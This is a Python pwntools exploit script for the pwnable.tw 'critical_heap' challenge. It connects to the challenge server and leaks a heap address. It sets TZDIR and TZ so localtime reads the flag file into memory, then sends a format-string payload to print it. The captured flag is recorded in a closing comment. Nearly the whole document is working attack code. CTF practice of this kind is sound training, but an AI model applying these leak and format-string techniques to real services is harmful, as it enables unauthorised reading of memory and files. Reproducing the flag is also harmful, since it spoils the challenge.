from pwn import *

elf = ELF("share/critical_heap")

p = remote('chall.pwnable.tw', 10500)


def create_heap(name, type, content=None):
    ''' type : 1 normal, 2 clock, 3 system
    context: only need when type = 1 '''

    p.sendlineafter('Your choice : ', '1')
    p.sendlineafter('Name of heap:', name)
    p.sendlineafter('Your choice : ', str(type))
    if type == 1:
        p.sendafter('Content of heap :', content)


def show_heap(index):
    p.sendlineafter('Your choice : ', '2')
    p.sendlineafter('Index of heap :', str(index))


def delete_heap(index):
    p.sendlineafter('Your choice : ', '5')
    p.sendlineafter('Index of heap :', str(index))


create_heap('system_heap', 3)

# play heap
p.sendlineafter('Your choice : ', '4')
p.sendlineafter('Index of heap :', '0')
# set
p.sendlineafter('Your choice : ', '1')
p.sendlineafter('Give me a name for the system heap :', 'XSEC')
p.sendlineafter('Give me a value for this name :', 'OVESEC')
# get
p.sendlineafter('Your choice : ', '4')
p.sendlineafter("What's name do you want to see :", 'XSEC')
# return
p.sendlineafter('Your choice : ', '5')

delete_heap(0)

create_heap('normal_heap', 1, 'A' * 8)  # 0

show_heap(0)
p.recvuntil('A' * 8)
leak_addr = u32(p.recv(4))
log.success('leak_addr --> ' + hex(leak_addr))

create_heap('system_heap2', 3)  # 1
# play heap
p.sendlineafter('Your choice : ', '4')
p.sendlineafter('Index of heap :', '1')
# set
p.sendlineafter('Your choice : ', '1')
p.sendlineafter('Give me a name for the system heap :', 'TZDIR')
p.sendlineafter('Give me a value for this name :', '/home/critical_heap++')
# set
p.sendlineafter('Your choice : ', '1')
p.sendlineafter('Give me a name for the system heap :', 'TZ')
p.sendlineafter('Give me a value for this name :', 'flag')
# return
p.sendlineafter('Your choice : ', '5')

create_heap('clock_heap', 2)  # 2

# flag_offset = 0x47b
flag_offset = 0x4ab
flag_addr = leak_addr + flag_offset

log.success('flag_addr --> ' + hex(flag_addr))

# play heap
p.sendlineafter('Your choice : ', '4')
p.sendlineafter('Index of heap :', '0')
# change
p.sendlineafter('Your choice : ', '2')
p.sendlineafter('Content :', b'%c%c%c%c%c%c%c%c%c%c%c%c%sAAAAAA' + p64(flag_addr))
# show
p.sendlineafter('Your choice : ', '1')

p.recvuntil('Your choice : ')

p.interactive()

# FLAG --> FLAG{Oh_y0u_f1nd_th3_s3cr3t_1n_loc4ltim3}
